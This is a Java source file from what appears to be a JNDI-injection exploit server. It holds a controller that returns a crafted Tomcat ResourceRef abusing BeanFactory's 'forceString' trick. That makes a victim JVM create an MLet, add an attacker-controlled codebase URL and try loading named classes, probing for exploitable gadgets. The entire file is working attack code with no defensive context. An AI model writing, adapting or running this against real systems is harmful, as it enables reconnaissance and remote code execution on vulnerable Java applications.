package com.example.exploit.controller;

import com.example.exploit.annotation.JNDIController;
import com.example.exploit.annotation.JNDIMapping;
import com.example.exploit.server.FileHandler;
import com.example.exploit.server.WebServer;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.util.Hashtable;

@JNDIController
@JNDIMapping("/MLet")
public class MLetController {
    public Hashtable<String, Object> process(Hashtable<String, String> params) throws Exception {
        String name = params.get("name");

        ResourceRef ref = new ResourceRef("javax.management.loading.MLet", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=loadClass,b=addURL,c=loadClass"));
        ref.add(new StringRefAddr("a", name));
        ref.add(new StringRefAddr("b", params.get("codebase")));
        ref.add(new StringRefAddr("c", name + "_exists"));

        WebServer.httpServer.createContext("/" + name.replace(".", "/") + "_exists.class", new FileHandler(null));

        System.out.println("MLet Gadget Detect");

        Hashtable<String, Object> result = new Hashtable<>();
        result.put("ref", ref);
        return result;
    }

    @JNDIMapping("/{name}")
    public void mLet(Hashtable<String, String> params) {
        System.out.println("[LDAP] Try to detect class: " + params.get("name"));
    }
}
